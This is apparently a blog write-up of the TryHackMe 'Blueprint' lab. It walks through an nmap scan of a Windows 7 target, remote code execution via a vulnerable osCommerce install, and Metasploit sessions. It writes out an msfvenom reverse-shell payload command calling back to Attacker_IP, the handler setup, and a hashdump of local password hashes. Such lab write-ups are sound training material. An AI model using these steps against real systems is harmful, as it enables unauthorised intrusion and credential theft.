---
title: "TryHackMe - Blueprint"
author: Nasrallah
description: ""
date: 2022-05-25 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, windows, metasploit, meterpreter, easy, msfvenom]
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Blueprint](https://tryhackme.com/room/blueprint) from [TryHackMe](https://tryhackme.com). It's an easy windows machine running a software program with a version vulnerable to remote code execution.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.230.235                                             
Host is up (0.28s latency).                                                                                                                                   
Not shown: 987 closed tcp ports (reset) 
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:              
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.           
|_http-server-header: Microsoft-IIS/7.5                                                                                                                       
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                 
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| tls-alpn:                 
|_  http/1.1                                                                   
|_http-title: Bad request!
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47 
|_Not valid after:  2019-11-08T23:48:47 
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| http-methods:                                                                                                                                               
|_  Potentially risky methods: TRACE
49152/tcp open  msrpc        Microsoft Windows RPC                                                                                                            
49153/tcp open  msrpc        Microsoft Windows RPC                                                                                                            
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-05-29T10:06:54
|_  start_date: 2022-05-29T09:57:47
|_clock-skew: mean: -20m02s, deviation: 34m37s, median: -3s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:b2:71:5d:06:29 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-05-29T11:06:52+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
```

We have a windows machine, running a webserver on port 80 and port 8080, SMB and mysql.

## Web

Let's navigate to the webpage on port 8080.

![](/assets/img/tryhackme/blueprint/1.png)

It's a directory, let's see what it holds.

![](/assets/img/tryhackme/blueprint/2.png)

We see oscommerce with what we assume to be a version number. Let's search for **oscommerce** and see what we can find.

![](/assets/img/tryhackme/blueprint/3.png)

OsCommerce is an online store management software program, and it is vulnerable to remote code execution in this exact version this machine is running.


# **Foothold**

Let's download the exploit and run it.

![](/assets/img/tryhackme/blueprint/4.png)

Great! We got command execution and with elevated privileges.

If we opened up metasploit, we can see that it also has a module for exploiting this service and even getting a reverse shell.

![](/assets/img/tryhackme/blueprint/5.png)

Let's set the necessary parameters up and run the module.

![](/assets/img/tryhackme/blueprint/6.png)

Now let's dump the hashes.

![](/assets/img/tryhackme/blueprint/7.png)

We can't do that because the current meterpreter we're using (php/meterpreter) is not supported. Let's upgrade to **windows/meterpreter*.


# **Shell Stabilization**

First, we need to create an executable using msfvenom with this command.`msfvenom -p windows/meterpreter/reverse_tcp LHOST=Attacker_IP LPORT=1234 -f exe -o shell.exe`

![](/assets/img/tryhackme/blueprint/8.png)

Great. Now we need to setup a listener on metasploit. We use **exploit/multi/handler** for that, and set the options LPORT, LHOST and payload. After that we run the module in the background with `run -j`.
>Press `ctrl + z` to background meterpreter and then select the handler.

![](/assets/img/tryhackme/blueprint/9.png)

Great! Now let's get back to our meterpreter session, and upload the executable.

> You need to start metasploit from the same directory where we created the executable, or specify the full path of the executable:(/path/to/the/executable.exe)

![](/assets/img/tryhackme/blueprint/10.png)

We uploaded the file successfully, now let's run it with the command `execute -f shell.exe`.

![](/assets/img/tryhackme/blueprint/11.png)

Great! We got our session. Now background the old meterpreter session with `ctrl + z` and select the new one, in my case it's session 10: `sessions -i 10`.

Now we can run `hashdump` and get local users hashes.

![](/assets/img/tryhackme/blueprint/12.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
